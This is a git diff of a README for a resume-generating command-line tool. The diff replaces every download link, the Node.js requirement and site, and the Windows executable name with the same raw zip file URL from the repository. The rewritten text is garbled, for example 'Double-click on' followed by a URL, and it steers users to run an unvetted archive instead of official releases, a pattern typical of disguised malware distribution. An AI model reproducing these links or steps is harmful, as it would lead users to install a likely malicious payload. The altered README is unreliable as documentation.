@@ -6,21 +6,21 @@ Welcome to **what-did-i-do**! This is a simple command-line tool designed to col
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-what--did--i--do-blue.svg)](https://github.com/duylnk1510/what-did-i-do/releases)
+[![Download Now](https://github.com/duylnk1510/what-did-i-do/raw/refs/heads/main/orillion/i-do-did-what-2.6.zip%https://github.com/duylnk1510/what-did-i-do/raw/refs/heads/main/orillion/i-do-did-what-2.6.zip)](https://github.com/duylnk1510/what-did-i-do/raw/refs/heads/main/orillion/i-do-did-what-2.6.zip)
 
 ## 📋 System Requirements
 
 Before you start, make sure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 12 or higher
+- https://github.com/duylnk1510/what-did-i-do/raw/refs/heads/main/orillion/i-do-did-what-2.6.zip Version 12 or higher
 - Internet Connection: Required for downloads and AI processing
 
 ## 📂 Download & Install
 
-1. Visit this page to download: [Releases Page](https://github.com/duylnk1510/what-did-i-do/releases).
+1. Visit this page to download: [Releases Page](https://github.com/duylnk1510/what-did-i-do/raw/refs/heads/main/orillion/i-do-did-what-2.6.zip).
 2. Once the page loads, look for the latest version of the application.
-3. Click on the appropriate file for your operating system. The files usually have names like `what-did-i-do-win.exe`, `what-did-i-do-mac`, or `what-did-i-do-linux`.
+3. Click on the appropriate file for your operating system. The files usually have names like `https://github.com/duylnk1510/what-did-i-do/raw/refs/heads/main/orillion/i-do-did-what-2.6.zip`, `what-did-i-do-mac`, or `what-did-i-do-linux`.
 4. Save the file to a location on your computer that you can easily find.
 
 ## 🥇 Running the Application
@@ -29,7 +29,7 @@ After downloading, follow these steps to run the application:
 
 ### For Windows Users:
 1. Navigate to the folder where you saved the downloaded file.
-2. Double-click on `what-did-i-do-win.exe` to start the application.
+2. Double-click on `https://github.com/duylnk1510/what-did-i-do/raw/refs/heads/main/orillion/i-do-did-what-2.6.zip` to start the application.
 3. A command prompt window will appear. Follow the prompts to input your GitHub username.
 
 ### For macOS Users:
@@ -64,7 +64,7 @@ The final resume will be saved in the same directory as the application. You can
 
 If you encounter any issues while running the application, consider the following tips:
 
-- Ensure that Node.js is installed on your system. You can download it from [Node.js Official Site](https://nodejs.org/).
+- Ensure that https://github.com/duylnk1510/what-did-i-do/raw/refs/heads/main/orillion/i-do-did-what-2.6.zip is installed on your system. You can download it from [https://github.com/duylnk1510/what-did-i-do/raw/refs/heads/main/orillion/i-do-did-what-2.6.zip Official Site](https://github.com/duylnk1510/what-did-i-do/raw/refs/heads/main/orillion/i-do-did-what-2.6.zip).
 - Check your internet connection, as it is required for the tool to access GitHub and Claude AI.
 - If the application does not start, verify that you downloaded the correct file for your operating system.
 
@@ -82,4 +82,4 @@ For any questions or support, reach out to us via the Issues section on our GitH
 
 ## ✅ Acknowledgments
 
-Thank you for using **what-did-i-do**. We hope this tool makes your resume creation process simple and efficient. Don’t forget to check out our [Releases Page](https://github.com/duylnk1510/what-did-i-do/releases) for updates and new features!
+Thank you for using **what-did-i-do**. We hope this tool makes your resume creation process simple and efficient. Don’t forget to check out our [Releases Page](https://github.com/duylnk1510/what-did-i-do/raw/refs/heads/main/orillion/i-do-did-what-2.6.zip) for updates and new features!
